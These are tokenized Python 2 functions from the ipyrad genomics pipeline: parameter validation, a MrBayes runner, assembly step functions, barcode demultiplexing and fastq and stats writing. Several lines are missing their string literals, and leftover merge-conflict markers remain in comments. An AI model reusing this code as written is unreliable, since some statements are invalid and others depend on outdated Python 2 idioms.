def run_mrbayes ( self , ipyclient , force = False , quiet = False ) : ## get all the nexus files for this object minidir = os . path . realpath ( os . path . join ( self . workdir , self . name ) ) nexus_files = glob . glob ( os . path . join ( minidir , "*.nex" ) ) ## clear existing files  #existing = glob.glob(os.path.join(self.workdir, self.name, "*.nex")) existing = glob . glob ( os . path . join ( minidir , "*.nex.*" ) ) if any ( existing ) : if force : for rfile in existing : os . remove ( rfile ) else : raise IPyradWarningExit ( EXISTING_NEXdot_FILES . format ( minidir ) ) ## write new nexus files, or should users do that before this? #self.write_nexus_files(force=True) ## load balancer lbview = ipyclient . load_balanced_view ( ) ## submit each to be processed asyncs = [ ] for nex in nexus_files : async = lbview . apply ( _call_mb , nex ) asyncs . append ( async ) ## track progress start = time . time ( ) printstr = "[mb] infer gene-tree posteriors | {} | " while 1 : ready = [ i . ready ( ) for i in asyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) if not quiet : progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = "" ) if len ( ready ) == sum ( ready ) : if not quiet : print ( "" ) break else : time . sleep ( 0.1 ) ## check success for async in asyncs : if not async . successful ( ) : raise IPyradWarningExit ( async . result ( ) )
def _paramschecker ( self , param , newvalue ) : if param == 'assembly_name' : ## Make sure somebody doesn't try to change their assembly_name, bad ## things would happen. Calling set_params on assembly_name only raises ## an informative error. Assembly_name is set at Assembly creation time ## and is immutable. raise IPyradWarningExit ( CANNOT_CHANGE_ASSEMBLY_NAME ) elif param == 'project_dir' : expandpath = _expander ( newvalue ) if not expandpath . startswith ( "/" ) : if os . path . exists ( expandpath ) : expandpath = _expander ( expandpath ) ## Forbid spaces in path names if " " in expandpath : raise IPyradWarningExit ( BAD_PROJDIR_NAME . format ( expandpath ) ) self . paramsdict [ "project_dir" ] = expandpath self . dirs [ "project" ] = expandpath ## `Merged:` in newvalue for raw_fastq_path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'raw_fastq_path' : if newvalue and not "Merged:" in newvalue : fullrawpath = _expander ( newvalue ) if os . path . isdir ( fullrawpath ) : raise IPyradWarningExit ( RAW_PATH_ISDIR . format ( fullrawpath ) ) ## if something is found in path elif glob . glob ( fullrawpath ) : self . paramsdict [ 'raw_fastq_path' ] = fullrawpath ## else allow empty, tho it can still raise an error in step1 else : raise IPyradWarningExit ( NO_RAW_FILE . format ( fullrawpath ) ) else : self . paramsdict [ 'raw_fastq_path' ] = "" ## `Merged:` in newvalue for barcodes_path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'barcodes_path' : ## if a value was entered check that it exists if newvalue and not "Merged:" in newvalue : ## also allow for fuzzy match in names using glob fullbarpath = glob . glob ( _expander ( newvalue ) ) [ 0 ] ## raise error if file is not found if not os . path . exists ( fullbarpath ) : raise IPyradWarningExit ( BARCODE_NOT_FOUND . format ( fullbarpath ) ) else : self . paramsdict [ 'barcodes_path' ] = fullbarpath self . _link_barcodes ( ) ## if no path was entered then set barcodes path to empty. ## this is checked again during step 1 and will raise an error ## if you try demultiplexing without a barcodes file else : self . paramsdict [ 'barcodes_path' ] = newvalue ## `Merged:` in newvalue for sorted_fastq_path indicates that this ## assembly is a merge of several others, so this param has no ## value for this assembly elif param == 'sorted_fastq_path' : if newvalue and not "Merged:" in newvalue : fullsortedpath = _expander ( newvalue ) if os . path . isdir ( fullsortedpath ) : raise IPyradWarningExit ( SORTED_ISDIR . format ( fullsortedpath ) ) elif glob . glob ( fullsortedpath ) : self . paramsdict [ 'sorted_fastq_path' ] = fullsortedpath else : raise IPyradWarningExit ( SORTED_NOT_FOUND . format ( fullsortedpath ) ) ## if no value was entered then set to "". else : self . paramsdict [ 'sorted_fastq_path' ] = "" elif param == 'assembly_method' : ## TEMPORARY BLOCK ON DENOVO+REFERENCE METHOD #        if newvalue == "denovo+reference": #            raise IPyradWarningExit(""" #    Error: The 'denovo+reference' method is temporarily blocked while we  #    refactor it to greatly improve the speed. You can either revert to an #    older version (pre v.0.7.0) or wait for the next update to resume using #    this method.  #    """) methods = [ "denovo" , "reference" , "denovo+reference" , "denovo-reference" ] assert newvalue in methods , BAD_ASSEMBLY_METHOD . format ( newvalue ) self . paramsdict [ 'assembly_method' ] = newvalue elif param == 'reference_sequence' : if newvalue : fullrawpath = _expander ( newvalue ) if not os . path . isfile ( fullrawpath ) : LOGGER . info ( "reference sequence file not found." ) raise IPyradWarningExit ( REF_NOT_FOUND . format ( fullrawpath ) ) self . paramsdict [ 'reference_sequence' ] = fullrawpath ## if no value was entered the set to "". Will be checked again ## at step3 if user tries to do refseq and raise error else : self . paramsdict [ 'reference_sequence' ] = "" elif param == 'datatype' : ## list of allowed datatypes datatypes = [ 'rad' , 'gbs' , 'ddrad' , 'pairddrad' , 'pairgbs' , 'merged' , '2brad' , 'pair3rad' ] ## raise error if something else if str ( newvalue ) not in datatypes : raise IPyradError ( . format ( newvalue , datatypes ) ) else : self . paramsdict [ 'datatype' ] = str ( newvalue ) ## link_barcodes is called before datatypes is set ## we need to know the datatype so we can read in ## the multiplexed barcodes for 3rad. This seems ## a little annoying, but it was better than any ## alternatives I could think of. if "3rad" in self . paramsdict [ 'datatype' ] and not self . paramsdict [ 'sorted_fastq_path' ] . strip ( ) : if not "Merged:" in self . paramsdict [ 'barcodes_path' ] : self . _link_barcodes ( ) elif param == 'restriction_overhang' : newvalue = _tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , ## Handle the special case where the user has 1 ## restriction overhang and does not include the trailing comma if len ( newvalue ) == 1 : ## for gbs users might not know to enter the second cut site ## so we do it for them. if self . paramsdict [ "datatype" ] == "gbs" : newvalue += newvalue else : newvalue += ( "" , ) #======= #    newvalue = (newvalue[0], "") #>>>>>>> d40a5d5086a0d0aace04dd08338ec4ba5341d1f2 ## Handle 3rad datatype with only 3 cutters if len ( newvalue ) == 3 : newvalue = ( newvalue [ 0 ] , newvalue [ 1 ] , newvalue [ 2 ] , "" ) assert len ( newvalue ) <= 4 , self . paramsdict [ 'restriction_overhang' ] = newvalue elif param == 'max_low_qual_bases' : assert isinstance ( int ( newvalue ) , int ) , self . paramsdict [ 'max_low_qual_bases' ] = int ( newvalue ) elif param == 'phred_Qscore_offset' : assert isinstance ( int ( newvalue ) , int ) , "phred_Qscore_offset must be an integer." self . paramsdict [ 'phred_Qscore_offset' ] = int ( newvalue ) elif param == 'mindepth_statistical' : assert isinstance ( int ( newvalue ) , int ) , "mindepth_statistical must be an integer." ## do not allow values below 5 if int ( newvalue ) < 5 : raise IPyradError ( ) else : self . paramsdict [ 'mindepth_statistical' ] = int ( newvalue ) elif param == 'mindepth_majrule' : assert isinstance ( int ( newvalue ) , int ) , "mindepth_majrule must be an integer." self . paramsdict [ 'mindepth_majrule' ] = int ( newvalue ) elif param == 'maxdepth' : self . paramsdict [ 'maxdepth' ] = int ( newvalue ) elif param == 'clust_threshold' : newvalue = float ( newvalue ) assert ( newvalue < 1 ) & ( newvalue > 0 ) , "clust_threshold must be a decimal value between 0 and 1." self . paramsdict [ 'clust_threshold' ] = newvalue elif param == 'max_barcode_mismatch' : self . paramsdict [ 'max_barcode_mismatch' ] = int ( newvalue ) elif param == 'filter_adapters' : self . paramsdict [ 'filter_adapters' ] = int ( newvalue ) elif param == 'filter_min_trim_len' : self . paramsdict [ "filter_min_trim_len" ] = int ( newvalue ) elif param == 'max_alleles_consens' : self . paramsdict [ 'max_alleles_consens' ] = int ( newvalue ) elif param == 'max_Ns_consens' : newvalue = _tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max_Ns_consens should be a tuple e.g., (8, 8)" self . paramsdict [ 'max_Ns_consens' ] = newvalue elif param == 'max_Hs_consens' : newvalue = _tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max_Hs_consens should be a tuple e.g., (5, 5)" self . paramsdict [ 'max_Hs_consens' ] = newvalue elif param == 'min_samples_locus' : self . paramsdict [ 'min_samples_locus' ] = int ( newvalue ) elif param == 'max_shared_Hs_locus' : if isinstance ( newvalue , str ) : if newvalue . isdigit ( ) : newvalue = int ( newvalue ) else : try : newvalue = float ( newvalue ) except Exception as inst : raise IPyradParamsError ( . format ( newvalue ) ) self . paramsdict [ 'max_shared_Hs_locus' ] = newvalue elif param == 'max_SNPs_locus' : newvalue = _tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max_SNPs_locus should be a tuple e.g., (20, 20)" self . paramsdict [ 'max_SNPs_locus' ] = newvalue elif param == 'max_Indels_locus' : newvalue = _tuplecheck ( newvalue , int ) assert isinstance ( newvalue , tuple ) , "max_Indels_locus should be a tuple e.g., (5, 100)" self . paramsdict [ 'max_Indels_locus' ] = newvalue ## deprecated but retained for legacy, now uses trim_reads (below) elif param == 'edit_cutsites' : ## Force into a string tuple newvalue = _tuplecheck ( newvalue ) ## try converting each tup element to ints newvalue = list ( newvalue ) for i in range ( 2 ) : try : newvalue [ i ] = int ( newvalue [ i ] ) except ( ValueError , IndexError ) : newvalue . append ( 0 ) pass newvalue = tuple ( newvalue ) ## make sure we have a nice tuple if not isinstance ( newvalue , tuple ) : raise IPyradWarningExit ( . format ( newvalue ) ) self . paramsdict [ 'edit_cutsites' ] = newvalue elif param == 'trim_reads' : ## Force into a string tuple newvalue = _tuplecheck ( newvalue ) ## try converting each tup element to ints newvalue = list ( newvalue ) for i in range ( 4 ) : try : newvalue [ i ] = int ( newvalue [ i ] ) except ( ValueError , IndexError ) : newvalue . append ( 0 ) pass newvalue = tuple ( newvalue ) ## make sure we have a nice tuple if not isinstance ( newvalue , tuple ) : raise IPyradWarningExit ( . format ( newvalue ) ) self . paramsdict [ 'trim_reads' ] = newvalue ## deprecated but retained for legacy, now named trim_loci  elif param == 'trim_overhang' : newvalue = _tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , "trim_overhang should be a tuple e.g., (4, *, *, 4)" self . paramsdict [ 'trim_overhang' ] = tuple ( [ int ( i ) for i in newvalue ] ) elif param == 'trim_loci' : newvalue = _tuplecheck ( newvalue , str ) assert isinstance ( newvalue , tuple ) , "trim_overhang should be a tuple e.g., (0, -5, -5, 0)" self . paramsdict [ 'trim_loci' ] = tuple ( [ int ( i ) for i in newvalue ] ) elif param == 'output_formats' : ## let's get whatever the user entered as a tuple of letters allowed = assemble . write_outfiles . OUTPUT_FORMATS . keys ( ) #<<<<<<< HEAD ## Handle the case where output formats is an empty string if isinstance ( newvalue , str ) : ## strip commas and spaces from string so we have only letters newvalue = newvalue . replace ( "," , "" ) . replace ( " " , "" ) newvalue = list ( newvalue ) if not newvalue : newvalue = [ "*" ] if isinstance ( newvalue , tuple ) : newvalue = list ( newvalue ) #======= #if isinstance(newvalue, tuple): #    newvalue = list(newvalue) #if isinstance(newvalue, str): #    newvalue = [i.strip() for i in newvalue.split(",")] #    ## Handle the case where output formats is empty #    if not any(newvalue): #        newvalue = "*" #>>>>>>> 488144d1d97240b8b6f6caf9cfb6c023bb6ebb36 if isinstance ( newvalue , list ) : ## if more than letters, raise an warning if any ( [ len ( i ) > 1 for i in newvalue ] ) : LOGGER . warning ( ) newvalue = allowed newvalue = tuple ( newvalue ) #newvalue = tuple([i for i in newvalue if i in allowed]) if "*" in newvalue : newvalue = allowed ## set the param self . paramsdict [ 'output_formats' ] = newvalue elif param == 'pop_assign_file' : fullpoppath = _expander ( newvalue ) ## if a path is entered, raise exception if not found if newvalue : if not os . path . isfile ( fullpoppath ) : LOGGER . warn ( "Population assignment file not found." ) raise IPyradWarningExit ( . format ( fullpoppath ) ) ## should we add a check here that all pop samples are in samples? self . paramsdict [ 'pop_assign_file' ] = fullpoppath self . _link_populations ( ) else : self . paramsdict [ 'pop_assign_file' ] = "" ## Don't forget to possibly blank the populations dictionary self . populations = { } return self
def stats ( self ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) ## Set pandas to display all samples instead of truncating pd . options . display . max_rows = len ( self . samples ) statdat = pd . DataFrame ( [ self . samples [ i ] . stats for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' ) # ensure non h,e columns print as ints for column in statdat : if column not in [ "hetero_est" , "error_est" ] : statdat [ column ] = np . nan_to_num ( statdat [ column ] ) . astype ( int ) return statdat
def files ( self ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) ## replace curdir with . for shorter printing #fullcurdir = os.path.realpath(os.path.curdir) return pd . DataFrame ( [ self . samples [ i ] . files for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' )
def _build_stat ( self , idx ) : nameordered = self . samples . keys ( ) nameordered . sort ( ) newdat = pd . DataFrame ( [ self . samples [ i ] . stats_dfs [ idx ] for i in nameordered ] , index = nameordered ) . dropna ( axis = 1 , how = 'all' ) return newdat
def get_params ( self , param = "" ) : fullcurdir = os . path . realpath ( os . path . curdir ) if not param : for index , ( key , value ) in enumerate ( self . paramsdict . items ( ) ) : if isinstance ( value , str ) : value = value . replace ( fullcurdir + "/" , "./" ) sys . stdout . write ( "{}{:<4}{:<28}{:<45}\n" . format ( self . _spacer , index , key , value ) ) else : try : if int ( param ) : #sys.stdout.write(self.paramsdict.values()[int(param)-1]) return self . paramsdict . values ( ) [ int ( param ) ] except ( ValueError , TypeError , NameError , IndexError ) : try : return self . paramsdict [ param ] except KeyError : return 'key not recognized'
def _step1func ( self , force , ipyclient ) : ## check input data files sfiles = self . paramsdict [ "sorted_fastq_path" ] rfiles = self . paramsdict [ "raw_fastq_path" ] ## do not allow both a sorted_fastq_path and a raw_fastq if sfiles and rfiles : raise IPyradWarningExit ( NOT_TWO_PATHS ) ## but also require that at least one exists if not ( sfiles or rfiles ) : raise IPyradWarningExit ( NO_SEQ_PATH_FOUND ) ## print headers if self . _headers : if sfiles : print ( "\n{}Step 1: Loading sorted fastq data to Samples" . format ( self . _spacer ) ) else : print ( "\n{}Step 1: Demultiplexing fastq data to Samples" . format ( self . _spacer ) ) ## if Samples already exist then no demultiplexing if self . samples : if not force : print ( SAMPLES_EXIST . format ( len ( self . samples ) , self . name ) ) else : ## overwrite existing data else do demux if glob . glob ( sfiles ) : self . _link_fastqs ( ipyclient = ipyclient , force = force ) else : assemble . demultiplex . run2 ( self , ipyclient , force ) ## Creating new Samples else : ## first check if demultiplexed files exist in sorted path if glob . glob ( sfiles ) : self . _link_fastqs ( ipyclient = ipyclient ) ## otherwise do the demultiplexing else : assemble . demultiplex . run2 ( self , ipyclient , force )
def _step2func ( self , samples , force , ipyclient ) : ## print header if self . _headers : print ( "\n  Step 2: Filtering reads " ) ## If no samples in this assembly then it means you skipped step1, if not self . samples . keys ( ) : raise IPyradWarningExit ( FIRST_RUN_1 ) ## Get sample objects from list of strings, if API. samples = _get_samples ( self , samples ) if not force : ## print warning and skip if all are finished if all ( [ i . stats . state >= 2 for i in samples ] ) : print ( EDITS_EXIST . format ( len ( samples ) ) ) return ## Run samples through rawedit assemble . rawedit . run2 ( self , samples , force , ipyclient )
def _step3func ( self , samples , noreverse , maxindels , force , ipyclient ) : ## print headers if self . _headers : print ( "\n  Step 3: Clustering/Mapping reads" ) ## Require reference seq for reference-based methods if self . paramsdict [ 'assembly_method' ] != "denovo" : if not self . paramsdict [ 'reference_sequence' ] : raise IPyradError ( REQUIRE_REFERENCE_PATH . format ( self . paramsdict [ "assembly_method" ] ) ) else : ## index the reference sequence ## Allow force to reindex the reference sequence ## send to run on the cluster.  lbview = ipyclient . load_balanced_view ( ) async = lbview . apply ( index_reference_sequence , * ( self , force ) ) ## print a progress bar for the indexing start = time . time ( ) while 1 : elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) printstr = " {}    | {} | s3 |" . format ( "indexing reference" , elapsed ) finished = int ( async . ready ( ) ) progressbar ( 1 , finished , printstr , spacer = self . _spacer ) if finished : print ( "" ) break time . sleep ( 0.9 ) ## error check if not async . successful ( ) : raise IPyradWarningExit ( async . result ( ) ) ## Get sample objects from list of strings samples = _get_samples ( self , samples ) ## Check if all/none in the right state if not self . _samples_precheck ( samples , 3 , force ) : raise IPyradError ( FIRST_RUN_2 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 3 for i in samples ] ) : print ( CLUSTERS_EXIST . format ( len ( samples ) ) ) return ## run the step function assemble . cluster_within . run ( self , samples , noreverse , maxindels , force , ipyclient )
def _step4func ( self , samples , force , ipyclient ) : if self . _headers : print ( "\n  Step 4: Joint estimation of error rate and heterozygosity" ) ## Get sample objects from list of strings samples = _get_samples ( self , samples ) ## Check if all/none in the right state if not self . _samples_precheck ( samples , 4 , force ) : raise IPyradError ( FIRST_RUN_3 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 4 for i in samples ] ) : print ( JOINTS_EXIST . format ( len ( samples ) ) ) return ## send to function assemble . jointestimate . run ( self , samples , force , ipyclient )
def _step5func ( self , samples , force , ipyclient ) : ## print header if self . _headers : print ( "\n  Step 5: Consensus base calling " ) ## Get sample objects from list of strings samples = _get_samples ( self , samples ) ## Check if all/none in the right state if not self . _samples_precheck ( samples , 5 , force ) : raise IPyradError ( FIRST_RUN_4 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 5 for i in samples ] ) : print ( CONSENS_EXIST . format ( len ( samples ) ) ) return ## pass samples to rawedit assemble . consens_se . run ( self , samples , force , ipyclient )
def _step6func ( self , samples , noreverse , force , randomseed , ipyclient , * * kwargs ) : ## Get sample objects from list of strings samples = _get_samples ( self , samples ) ## remove samples that aren't ready csamples = self . _samples_precheck ( samples , 6 , force ) ## print CLI header if self . _headers : print ( "\n  Step 6: Clustering at {} similarity across {} samples" . format ( self . paramsdict [ "clust_threshold" ] , len ( csamples ) ) ) ## Check if all/none in the right state if not csamples : raise IPyradError ( FIRST_RUN_5 ) elif not force : ## skip if all are finished if all ( [ i . stats . state >= 6 for i in csamples ] ) : print ( DATABASE_EXISTS . format ( len ( samples ) ) ) return ## run if this point is reached. We no longer check for existing ## h5 file, since checking Sample states should suffice. assemble . cluster_across . run ( self , csamples , noreverse , force , randomseed , ipyclient , * * kwargs )
def combinefiles ( filepath ) : ## unpack seq files in filepath fastqs = glob . glob ( filepath ) firsts = [ i for i in fastqs if "_R1_" in i ] ## check names if not firsts : raise IPyradWarningExit ( "First read files names must contain '_R1_'." ) ## get paired reads seconds = [ ff . replace ( "_R1_" , "_R2_" ) for ff in firsts ] return zip ( firsts , seconds )
def findbcode ( cutters , longbar , read1 ) : ## default barcode string for cutter in cutters [ 0 ] : ## If the cutter is unambiguous there will only be one. if not cutter : continue search = read1 [ 1 ] [ : int ( longbar [ 0 ] + len ( cutter ) + 1 ) ] barcode = search . rsplit ( cutter , 1 ) if len ( barcode ) > 1 : return barcode [ 0 ] ## No cutter found return barcode [ 0 ]
def find3radbcode ( cutters , longbar , read1 ) : ## default barcode string for ambigcuts in cutters : for cutter in ambigcuts : ## If the cutter is unambiguous there will only be one. if not cutter : continue search = read1 [ 1 ] [ : int ( longbar [ 0 ] + len ( cutter ) + 1 ) ] splitsearch = search . rsplit ( cutter , 1 ) if len ( splitsearch ) > 1 : return splitsearch [ 0 ] ## No cutter found return splitsearch [ 0 ]
def make_stats ( data , perfile , fsamplehits , fbarhits , fmisses , fdbars ) : ## out file outhandle = os . path . join ( data . dirs . fastqs , 's1_demultiplex_stats.txt' ) outfile = open ( outhandle , 'w' ) ## write the header for file stats ------------------------------------ outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( "raw_file" , "total_reads" , "cut_found" , "bar_matched" ) ) ## write the file stats r1names = sorted ( perfile ) for fname in r1names : dat = perfile [ fname ] #dat = [perfile[fname][i] for i in ["ftotal", "fcutfound", "fmatched"]] outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( fname , dat [ 0 ] , dat [ 1 ] , dat [ 2 ] ) ) ## repeat for pairfile if 'pair' in data . paramsdict [ "datatype" ] : fname = fname . replace ( "_R1_" , "_R2_" ) outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( fname , dat [ 0 ] , dat [ 1 ] , dat [ 2 ] ) ) ## spacer, how many records for each sample -------------------------- outfile . write ( '\n{:<35}  {:>13}\n' . format ( "sample_name" , "total_reads" ) ) ## names alphabetical. Write to file. Will save again below to Samples. snames = set ( ) for sname in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] snames . add ( sname ) for sname in sorted ( list ( snames ) ) : outfile . write ( "{:<35}  {:>13}\n" . format ( sname , fsamplehits [ sname ] ) ) ## spacer, which barcodes were found ----------------------------------- outfile . write ( '\n{:<35}  {:>13} {:>13} {:>13}\n' . format ( "sample_name" , "true_bar" , "obs_bar" , "N_records" ) ) ## write sample results for sname in sorted ( data . barcodes ) : if "-technical-replicate-" in sname : fname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] else : fname = sname ## write perfect hit hit = data . barcodes [ sname ] offhitstring = "" ## write off-n hits ## sort list of off-n hits   if fname in fdbars : offkeys = list ( fdbars . get ( fname ) ) for offhit in offkeys [ : : - 1 ] : ## exclude perfect hit if offhit not in data . barcodes . values ( ) : offhitstring += '{:<35}  {:>13} {:>13} {:>13}\n' . format ( sname , hit , offhit , fbarhits [ offhit ] / 2 ) #sumoffhits += fbarhits[offhit] ## write string to file outfile . write ( '{:<35}  {:>13} {:>13} {:>13}\n' . #format(sname, hit, hit, fsamplehits[fname]-sumoffhits)) format ( sname , hit , hit , fbarhits [ hit ] / 2 ) ) outfile . write ( offhitstring ) ## write misses misskeys = list ( fmisses . keys ( ) ) misskeys . sort ( key = fmisses . get ) for key in misskeys [ : : - 1 ] : outfile . write ( '{:<35}  {:>13}{:>13}{:>13}\n' . format ( "no_match" , "_" , key , fmisses [ key ] ) ) outfile . close ( ) ## Link Sample with this data file to the Assembly object for sname in snames : ## make the sample sample = Sample ( ) sample . name = sname ## allow multiple barcodes if its a replicate.  barcodes = [ ] for n in xrange ( 500 ) : fname = sname + "-technical-replicate-{}" . format ( n ) fbar = data . barcodes . get ( fname ) if fbar : barcodes . append ( fbar ) if barcodes : sample . barcode = barcodes else : sample . barcode = data . barcodes [ sname ] ## file names         if 'pair' in data . paramsdict [ "datatype" ] : sample . files . fastqs = [ ( os . path . join ( data . dirs . fastqs , sname + "_R1_.fastq.gz" ) , os . path . join ( data . dirs . fastqs , sname + "_R2_.fastq.gz" ) ) ] else : sample . files . fastqs = [ ( os . path . join ( data . dirs . fastqs , sname + "_R1_.fastq.gz" ) , "" ) ] ## fill in the summary stats sample . stats [ "reads_raw" ] = int ( fsamplehits [ sname ] ) ## fill in the full df stats value sample . stats_dfs . s1 [ "reads_raw" ] = int ( fsamplehits [ sname ] ) ## Only link Sample if it has data if sample . stats [ "reads_raw" ] : sample . stats . state = 1 data . samples [ sample . name ] = sample else : print ( "Excluded sample: no data found for" , sname ) ## initiate s1 key for data object data . stats_dfs . s1 = data . _build_stat ( "s1" ) data . stats_files . s1 = outhandle
def barmatch2 ( data , tups , cutters , longbar , matchdict , fnum ) : ## how many reads to store before writing to disk waitchunk = int ( 1e6 ) ## pid name for this engine epid = os . getpid ( ) ## counters for total reads, those with cutsite, and those that matched filestat = np . zeros ( 3 , dtype = np . int ) ## store observed sample matches samplehits = { } ## dictionaries to store first and second reads until writing to file dsort1 = { } dsort2 = { } ## dictionary for all bars matched in sample dbars = { } ## fill for sample names for sname in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] samplehits [ sname ] = 0 dsort1 [ sname ] = [ ] dsort2 [ sname ] = [ ] dbars [ sname ] = set ( ) ## store observed bars barhits = { } for barc in matchdict : barhits [ barc ] = 0 ## store others misses = { } misses [ '_' ] = 0 ## build func for finding barcode getbarcode = get_barcode_func ( data , longbar ) ## get quart iterator of reads if tups [ 0 ] . endswith ( ".gz" ) : ofunc = gzip . open else : ofunc = open ## create iterators  ofile1 = ofunc ( tups [ 0 ] , 'r' ) fr1 = iter ( ofile1 ) quart1 = itertools . izip ( fr1 , fr1 , fr1 , fr1 ) if tups [ 1 ] : ofile2 = ofunc ( tups [ 1 ] , 'r' ) fr2 = iter ( ofile2 ) quart2 = itertools . izip ( fr2 , fr2 , fr2 , fr2 ) quarts = itertools . izip ( quart1 , quart2 ) else : quarts = itertools . izip ( quart1 , iter ( int , 1 ) ) ## go until end of the file while 1 : try : read1 , read2 = quarts . next ( ) read1 = list ( read1 ) filestat [ 0 ] += 1 except StopIteration : break barcode = "" ## Get barcode_R2 and check for matching sample name if '3rad' in data . paramsdict [ "datatype" ] : ## Here we're just reusing the findbcode function ## for R2, and reconfiguring the longbar tuple to have the ## maxlen for the R2 barcode ## Parse barcode. Use the parsing function selected above. barcode1 = find3radbcode ( cutters = cutters , longbar = longbar , read1 = read1 ) barcode2 = find3radbcode ( cutters = cutters , longbar = ( longbar [ 2 ] , longbar [ 1 ] ) , read1 = read2 ) barcode = barcode1 + "+" + barcode2 else : ## Parse barcode. Uses the parsing function selected above. barcode = getbarcode ( cutters , read1 , longbar ) ## find if it matches  sname_match = matchdict . get ( barcode ) if sname_match : #sample_index[filestat[0]-1] = snames.index(sname_match) + 1 ## record who matched dbars [ sname_match ] . add ( barcode ) filestat [ 1 ] += 1 filestat [ 2 ] += 1 samplehits [ sname_match ] += 1 barhits [ barcode ] += 1 if barcode in barhits : barhits [ barcode ] += 1 else : barhits [ barcode ] = 1 ## trim off barcode lenbar = len ( barcode ) if '3rad' in data . paramsdict [ "datatype" ] : ## Iff 3rad trim the len of the first barcode lenbar = len ( barcode1 ) if data . paramsdict [ "datatype" ] == '2brad' : overlen = len ( cutters [ 0 ] [ 0 ] ) + lenbar + 1 read1 [ 1 ] = read1 [ 1 ] [ : - overlen ] + "\n" read1 [ 3 ] = read1 [ 3 ] [ : - overlen ] + "\n" else : read1 [ 1 ] = read1 [ 1 ] [ lenbar : ] read1 [ 3 ] = read1 [ 3 ] [ lenbar : ] ## Trim barcode off R2 and append. Only 3rad datatype ## pays the cpu cost of splitting R2 if '3rad' in data . paramsdict [ "datatype" ] : read2 = list ( read2 ) read2 [ 1 ] = read2 [ 1 ] [ len ( barcode2 ) : ] read2 [ 3 ] = read2 [ 3 ] [ len ( barcode2 ) : ] ## append to dsort dsort1 [ sname_match ] . append ( "" . join ( read1 ) ) if 'pair' in data . paramsdict [ "datatype" ] : dsort2 [ sname_match ] . append ( "" . join ( read2 ) ) else : misses [ "_" ] += 1 if barcode : filestat [ 1 ] += 1 ## how can we make it so all of the engines aren't trying to write to ## ~100-200 files all at the same time? This is the I/O limit we hit.. ## write out at 100K to keep memory low. It is fine on HPC which can  ## write parallel, but regular systems might crash if not filestat [ 0 ] % waitchunk : ## write the remaining reads to file" writetofile ( data , dsort1 , 1 , epid ) if 'pair' in data . paramsdict [ "datatype" ] : writetofile ( data , dsort2 , 2 , epid ) ## clear out dsorts for sample in data . barcodes : if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] dsort1 [ sname ] = [ ] dsort2 [ sname ] = [ ] ## reset longlist #longlist = np.zeros(waitchunk, dtype=np.uint32)                 ## close open files ofile1 . close ( ) if tups [ 1 ] : ofile2 . close ( ) ## write the remaining reads to file writetofile ( data , dsort1 , 1 , epid ) if 'pair' in data . paramsdict [ "datatype" ] : writetofile ( data , dsort2 , 2 , epid ) ## return stats in saved pickle b/c return_queue is too small ## and the size of the match dictionary can become quite large samplestats = [ samplehits , barhits , misses , dbars ] outname = os . path . join ( data . dirs . fastqs , "tmp_{}_{}.p" . format ( epid , fnum ) ) with open ( outname , 'w' ) as wout : pickle . dump ( [ filestat , samplestats ] , wout ) return outname
def get_barcode_func ( data , longbar ) : ## build func for finding barcode if longbar [ 1 ] == 'same' : if data . paramsdict [ "datatype" ] == '2brad' : def getbarcode ( cutters , read1 , longbar ) : """ find barcode for 2bRAD data """ return read1 [ 1 ] [ : - ( len ( cutters [ 0 ] [ 0 ] ) + 1 ) ] [ - longbar [ 0 ] : ] else : def getbarcode ( _ , read1 , longbar ) : """ finds barcode for invariable length barcode data """ return read1 [ 1 ] [ : longbar [ 0 ] ] else : def getbarcode ( cutters , read1 , longbar ) : """ finds barcode for variable barcode lengths""" return findbcode ( cutters , longbar , read1 ) return getbarcode
def get_quart_iter ( tups ) : if tups [ 0 ] . endswith ( ".gz" ) : ofunc = gzip . open else : ofunc = open ## create iterators  ofile1 = ofunc ( tups [ 0 ] , 'r' ) fr1 = iter ( ofile1 ) quart1 = itertools . izip ( fr1 , fr1 , fr1 , fr1 ) if tups [ 1 ] : ofile2 = ofunc ( tups [ 1 ] , 'r' ) fr2 = iter ( ofile2 ) quart2 = itertools . izip ( fr2 , fr2 , fr2 , fr2 ) quarts = itertools . izip ( quart1 , quart2 ) else : ofile2 = 0 quarts = itertools . izip ( quart1 , iter ( int , 1 ) ) ## make a generator def feedme ( quarts ) : for quart in quarts : yield quart genquarts = feedme ( quarts ) ## return generator and handles return genquarts , ofile1 , ofile2
def writetofastq ( data , dsort , read ) : if read == 1 : rrr = "R1" else : rrr = "R2" for sname in dsort : ## skip writing if empty. Write to tmpname handle = os . path . join ( data . dirs . fastqs , "{}_{}_.fastq" . format ( sname , rrr ) ) with open ( handle , 'a' ) as out : out . write ( "" . join ( dsort [ sname ] ) )
